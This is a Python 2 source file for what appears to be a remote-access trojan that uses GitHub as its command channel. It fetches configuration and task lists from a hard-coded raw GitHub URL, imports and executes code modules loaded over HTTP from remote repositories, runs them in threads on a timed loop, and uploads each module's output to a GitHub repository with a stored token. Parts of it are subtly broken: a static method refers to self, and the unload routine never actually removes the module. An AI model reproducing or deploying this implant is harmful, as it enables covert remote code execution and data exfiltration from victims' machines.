#!/usr/bin/env python
import sys
import json
import time
import base64
import random
import Queue
import threading
# from github3 import login
# try:
#     from urllib2 import urlopen
# except ImportError:
#     from urllib.request import urlopen
import logging
# log_FORMAT = '%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
log_FORMAT = '[%(asctime)s] [%(levelname)s] [ %(filename)s:%(lineno)s] %(message)s '
logging.basicConfig(format=log_FORMAT)
logger = logging.getLogger(__name__)
# logger.setLevel(logging.WARN)
logger.setLevel(logging.INFO)

from httpimp import add_remote_repo, remove_remote_repo
from toy.modules import gh


class Boy(object):
    _id = 'abc'
    _url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/conf.json'

    def __init__(self, config):
        self.task_queue = Queue.Queue()
        self.result_path = 'data/%s/' % self._id
        self.parse_conf(config)
        self.init = True

    def parse_conf(self, config):
        self.guser = config.pop('gu', '')
        self.gtoken = config.pop('gt', '')
        self.grepo = config.pop('gr', '')
        self.base_modules = config.pop('bm', {})
        self.conf_url = config.pop('cu', None)
        self.task_url = config.pop('tu', None)
        self.run_modules = config.pop('rm', [])
        self.cf = int(config.pop('cf', 60))

    # @staticmethod
    # def connect(u, p, r, b='master'):
    #     gh = login(username=u, password=p)
    #     repo = gh.repository(u, r)
    #     branch = repo.branch(b)
    #     return gh, repo, branch

    # @staticmethod
    # def save_result(repo, path, data, msg='new result'):
    #     # remote_path = path + '%d.data' % random.randint(1000, 100000)
    #     repo.create_file(path, msg, base64.b64encode(data))
    #     return

    # @staticmethod
    # def get_file(url):
    #     try:
    #         data = urlopen(url).read()
    #     except Exception:
    #         data = None
    #     return data

    @staticmethod
    def load(module, url):
        try:
            logging.info('Try to import module')
            add_remote_repo([module], url)
            exec "import %s" % module
        except Exception:
            logging.error('Exception with import %s' % module)
            pass

    @staticmethod
    def unload(module, url):
        remove_remote_repo(url)
        if module in sys.modules:
            del module

    def install(self):
        for url, pkgs in self.base_modules.items():
            if not isinstance(pkgs, (list, tuple)):
                pkgs = [pkgs]
            for p in pkgs:
                self.load(p, url)
        for pkg in self.run_modules:
            self.load_module(pkg['module'])
        self.init = False

        # for m in self.run_modules:
        #     try:
        #         exec "from toy.modules import %s" % m
        #         mod = 'toy.modules.%s' % m
        #         t = threading.Thread(
        #             target=self.worker, args=(mod,))
        #         t.start()
        #         time.sleep(random.randint(1, 10))
        #         # m.run()
        #     except Exception:
        #         print 'exception with %s' % m
        #         pass

    @staticmethod
    def get_config(config_url):
        config = gh.get_raw(config_url)
        if config:
            config = json.loads(config)
        else:
            config = {}
        return config

    @staticmethod
    def parse_require(pkg):
        requires = pkg.get('require', None)
        if requires:
            for k, v in requires.items():
                self.load(v, k)

    def check(self, url=None):
        url = url or self.conf_url
        conf = self.get_config(url)
        self.parse_conf(conf)
        for task in self.run_modules:
            self.load_module(task['module'])
        tasks = self.load_task(self.task_url) if self.task_url else []
        self.run_modules += tasks

    @staticmethod
    def load_module(mod, pkg='toy.modules'):
        try:
            logging.info('Import %s from %s' % (mod, pkg))
            exec "from %s import %s" % (pkg, mod)
        except Exception:
            logging.error("Import %s error" % '.'.join((pkg, mod)))

    def load_task(self, task_url):
        tasks = gh.get_raw(task_url)
        if tasks:
            tasks = json.loads(tasks)
            self.load(tasks['name'], tasks['url'])
            for task in tasks['task']:
                self.load_module(task['module'], tasks['name'] + '.modules')
        else:
            tasks = []
        return tasks

    @staticmethod
    def enc(data):
        pass

    @staticmethod
    def dec(data):
        pass

    def worker(self, m, loop=False):
        path = self.result_path + '%d.data' % random.randint(
            1000, 100000)
        self.task_queue.put(1)
        print sys.modules[m]
        result = sys.modules[m].run() or 'Err'
        self.task_queue.get()
        if result:
            logger.info('[*] Get result: %s' % result)
            gh.put(self.guser, self.gtoken, self.grepo, path, result)
        if not loop:
            del sys.modules[m]
        return

    def run(self):
        self.install()
        while True:
            if self.task_queue.empty():
                if not self.init:
                    self.check()
                for task in self.run_modules:
                    logging.info("run task %s" % task['module'])
                    mod = 'toy.modules.%s' % task['module']
                    try:
                        t = threading.Thread(
                            target=self.worker, args=(mod,))
                        t.start()
                        time.sleep(random.randint(1, 10))
                    except Exception:
                        logging.error('run exception')
                        pass
            time.sleep(self.cf)
            # time.sleep(random.randint(1000, 10000))
